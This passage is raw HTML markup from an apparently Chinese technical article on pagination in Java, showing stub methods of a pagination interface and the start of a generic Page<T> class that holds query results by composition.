data-slate-object="annotation" data-annotation-key="gkann_1125782148" data-annotation-type="annotation"><span 
data-slate-string="true">void</span></span></span></span><span data-slate-leaf="true" data-offset-key="1367:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1367:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_4284872004" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_3528955924" data-annotation-type="annotation"><span 
data-slate-string="true">setPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1367:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_3822621763" data-annotation-type="annotation"><span data-slate-string="true">(int 
pageNo)</span></span></span></span><span data-slate-leaf="true" data-offset-key="1367:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_3528955924" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1367:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1368"> <span data-slate-object="text" data-key="1369"><span data-slate-leaf="true" 
data-offset-key="1369:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1370"> <span data-slate-object="text" data-key="1371"><span data-slate-leaf="true" 
data-offset-key="1371:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1371:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_2681589917" data-annotation-type="annotation"><span data-slate-string="true">// 
数据访问层需要的 start 和 end</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="1372"> <span data-slate-object="text" 
data-key="1373"><span data-slate-leaf="true" data-offset-key="1373:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1373:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5705325315" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1373:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_7990470305" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5851044421" 
data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1373:5"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6308216626" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5851044421" 
data-annotation-type="annotation"><span data-slate-string="true">getStart</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:6"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_9304244706" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5851044421" data-annotation-type="annotation"><span 
data-slate-string="true">()</span></span></span></span><span data-slate-leaf="true" data-offset-key="1373:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5851044421" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1373:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1374"> <span data-slate-object="text" data-key="1375"><span data-slate-leaf="true" 
data-offset-key="1375:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1375:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6790237312" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1375:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5124367424" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1375:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0672024496" data-annotation-type="annotation"><span 
data-slate-string="true">int</span></span></span></span><span data-slate-leaf="true" data-offset-key="1375:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5124367424" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1375:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_5846189484" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span 
data-slate-string="true">getEnd</span></span></span></span><span data-slate-leaf="true" data-offset-key="1375:6"><span 
class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_4029408552" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1375:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5124367424" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1375:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1376"> <span data-slate-object="text" data-key="1377"><span data-slate-leaf="true" 
data-offset-key="1377:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1378"> <span data-slate-object="text" data-key="1379"><span data-slate-leaf="true" 
data-offset-key="1379:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1379:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_3723487941" data-annotation-type="annotation"><span data-slate-string="true">// 
是否还有上一页、下一页</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1380"> <span data-slate-object="text" data-key="1381"><span 
data-slate-leaf="true" data-offset-key="1381:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1381:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_4711686172" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0544727637" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1381:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_2324986679" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true">boolean</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0544727637" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1381:5"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_4407851476" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true">hasNextPage</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:6"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_8414386946" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0544727637" data-annotation-type="annotation"><span 
data-slate-string="true">()</span></span></span></span><span data-slate-leaf="true" data-offset-key="1381:7"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0544727637" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1381:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1382"> <span data-slate-object="text" data-key="1383"><span data-slate-leaf="true" 
data-offset-key="1383:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1383:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_0510833229" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1383:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7903838591" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1383:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_5729460357" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="1383:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7903838591" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1383:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_7376100620" data-annotation-type="annotation"><span 
data-slate-string="true">hasPrevPage</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1383:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7903838591" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_5091197692" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1383:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7903838591" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1383:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1384"> <span data-slate-object="text" data-key="1385"><span data-slate-leaf="true" 
data-offset-key="1385:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1386"> <span data-slate-object="text" data-key="1387"><span data-slate-leaf="true" 
data-offset-key="1387:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1387:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_0031931102" data-annotation-type="annotation"><span data-slate-string="true">// 
当前在哪一页</span></span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1388"> <span data-slate-object="text" data-key="1389"><span 
data-slate-leaf="true" data-offset-key="1389:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1389:1"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_8589066572" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1389:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1389:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_1583357199" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4263270490" 
data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1389:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1389:5"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_0464156560" data-annotation-type="annotation"><span 
data-slate-string="true">getPageNo</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1389:6"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4263270490" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_7987426744" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1389:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4263270490" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1389:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1390"> <span data-slate-object="text" data-key="1391"><span data-slate-leaf="true" 
data-offset-key="1391:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 316px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <h3 class="se-834d0d2f" data-slate-type="heading" data-slate-object="block" 
data-key="1392"><span data-slate-object="text" data-key="1393"><span data-slate-leaf="true" 
data-offset-key="1393:0" data-first-offset="true"><span data-slate-string="true">绑定查询结果的分页对象</span></span></span></h3> 
<div class="se-ef6c0583 " data-slate-type="paragraph" data-slate-object="block" data-key="1394"> 
<span data-slate-object="text" data-key="1395"><span data-slate-leaf="true" data-offset-key="1395:0" 
data-first-offset="true"><span class="se-ca64a468" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">第二种则将分页对象和查询数据的结果集绑定在一起，有的是将结果集对象继承自一个分页类，有的则是将结果集对象以组合的方式放到分页对象里面，数据访问层直接返回这个携带实际数据的分页对象。</span></span></span></span><span 
data-slate-object="text" data-key="1396"><span data-slate-leaf="true" data-offset-key="1396:0" 
data-first-offset="true"><span data-slate-string="true">从优先使用组合而不是继承的角度来说，组合的方式通常更好一些。</span></span></span> 
</div> <div class="se-856117e8 " data-slate-type="paragraph" data-slate-object="block" data-key="1397"> 
<span data-slate-object="text" data-key="1398"><span data-slate-leaf="true" data-offset-key="1398:0" 
data-first-offset="true"><span data-slate-string="true">具体说，我们可以定义这样的分页对象：</span></span></span> 
</div> <div class="se-844d02df se-cde2c9d6" data-slate-type="pre" data-slate-object="block" 
data-key="1399" data-code-language="cpp"> <div class="se-47a28eed se-fb0226ba"> <span></span> 
</div> <div class="se-133e5553"> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="1"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="2"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="3"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="4"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="5"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="6"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="7"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="8"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="9"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="10"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="11"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="12"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="13"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="14"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="15"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="16"></div> 
<div class="se-450f0a44 se-4b7646a8" data-code-line-number="17"></div> <div class="se-450f0a44 
se-4b7646a8" data-code-line-number="18"></div> <div class="se-450f0a44 se-4b7646a8" data-code-line-number="19"></div> 
</div> <div class="se-269e3ed3 ps ps--active-x"> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1400"> <span data-slate-object="text" data-key="1401"><span 
data-slate-leaf="true" data-offset-key="1401:0" data-first-offset="true"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8754773622" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span><span data-slate-leaf="true" data-offset-key="1401:1"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1401:2"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_4740427630" 
data-annotation-type="annotation"><span data-slate-string="true">class</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1401:3"><span class=" gkhl-class" data-slate-object="annotation" 
data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1401:4"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_2267575282" data-annotation-type="annotation"><span 
data-slate-string="true">Page</span></span></span></span><span data-slate-leaf="true" data-offset-key="1401:5"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_2568315340" data-annotation-type="annotation"><span 
data-slate-string="true">&lt;T&gt; {</span></span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1402"> <span data-slate-object="text" 
data-key="1403"><span data-slate-leaf="true" data-offset-key="1403:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1403:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_5479666366" 
data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1403:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1403:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1368102186" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1403:4"><span data-slate-string="true"> pageNo;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1404"> <span data-slate-object="text" data-key="1405"><span data-slate-leaf="true" 
data-offset-key="1405:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1405:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_2018064994" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1405:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1405:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1575898345" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1405:4"><span data-slate-string="true"> totalCount;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1406"> <span data-slate-object="text" data-key="1407"><span data-slate-leaf="true" 
data-offset-key="1407:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1407:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_9338451626" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1407:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1407:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8921816192" data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span><span 
data-slate-leaf="true" data-offset-key="1407:4"><span data-slate-string="true"> pageSize;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1408"> <span data-slate-object="text" data-key="1409"><span data-slate-leaf="true" 
data-offset-key="1409:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1409:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4072271057" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1409:2"><span data-slate-string="true"> Collection&lt;T&gt; 
data; </span></span><span data-slate-leaf="true" data-offset-key="1409:3"><span class=" gkhl-comment" 
data-slate-object="annotation" data-annotation-key="gkann_2836090043" data-annotation-type="annotation"><span 
data-slate-string="true">// 当前页的实际业务对象</span></span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1410"> <span data-slate-object="text" 
data-key="1411"><span data-slate-leaf="true" data-offset-key="1411:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span></span> </div> <div class="se-51dc759d se-59b5131a" 
data-slate-type="code-line" data-slate-object="block" data-key="1412"> <span data-slate-object="text" 
data-key="1413"><span data-slate-leaf="true" data-offset-key="1413:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1413:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_1815068801" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1413:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1413:3"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_1314545517" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_5137500007" 
data-annotation-type="annotation"><span data-slate-string="true">Page</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1413:4"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_6305615691" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span 
data-slate-string="true">(Collection&lt;T&gt; data, int pageSize, int pageNo, int totalCount)</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1413:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_5137500007" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1413:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1414"> <span data-slate-object="text" data-key="1415"><span data-slate-leaf="true" 
data-offset-key="1415:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1415:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3346588532" data-annotation-type="annotation"><span data-slate-string="true">this</span></span></span><span 
data-slate-leaf="true" data-offset-key="1415:2"><span data-slate-string="true">.data = data;</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1416"> <span data-slate-object="text" data-key="1417"><span data-slate-leaf="true" 
data-offset-key="1417:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1417:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_6703147792" data-annotation-type="annotation"><span data-slate-string="true">this</span></span></span><span 
data-slate-leaf="true" data-offset-key="1417:2"><span data-slate-string="true">.pageSize = 
pageSize;</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1418"> <span data-slate-object="text" data-key="1419"><span 
data-slate-leaf="true" data-offset-key="1419:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1419:1"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9959262368" data-annotation-type="annotation"><span 
data-slate-string="true">this</span></span></span><span data-slate-leaf="true" data-offset-key="1419:2"><span 
data-slate-string="true">.pageNo = pageNo;</span></span></span> </div> <div class="se-51dc759d 
se-59b5131a" data-slate-type="code-line" data-slate-object="block" data-key="1420"> <span data-slate-object="text" 
data-key="1421"><span data-slate-leaf="true" data-offset-key="1421:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1421:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_2461053252" 
data-annotation-type="annotation"><span data-slate-string="true">this</span></span></span><span 
data-slate-leaf="true" data-offset-key="1421:2"><span data-slate-string="true">.totalCount 
= totalCount;</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1422"> <span data-slate-object="text" data-key="1423"><span 
data-slate-leaf="true" data-offset-key="1423:0" data-first-offset="true"><span data-slate-string="true"> 
}</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1424"> <span data-slate-object="text" data-key="1425"><span 
data-slate-leaf="true" data-offset-key="1425:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span></span> </div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" 
data-slate-object="block" data-key="1426"> <span data-slate-object="text" data-key="1427"><span 
data-slate-leaf="true" data-offset-key="1427:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1427:1"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7293233827" 
data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1427:2"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1427:3"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_9575953830" data-annotation-type="annotation"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_0612463576" 
data-annotation-type="annotation"><span data-slate-string="true">int</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1427:4"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1427:5"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_6157266757" data-annotation-type="annotation"><span 
data-slate-string="true">getPageSize</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1427:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_1463499681" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1427:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_0612463576" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1427:8"><span data-slate-string="true">{}</span></span></span> 
</div> <div class="se-51dc759d se-59b5131a" data-slate-type="code-line" data-slate-object="block" 
data-key="1428"> <span data-slate-object="text" data-key="1429"><span data-slate-leaf="true" 
data-offset-key="1429:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
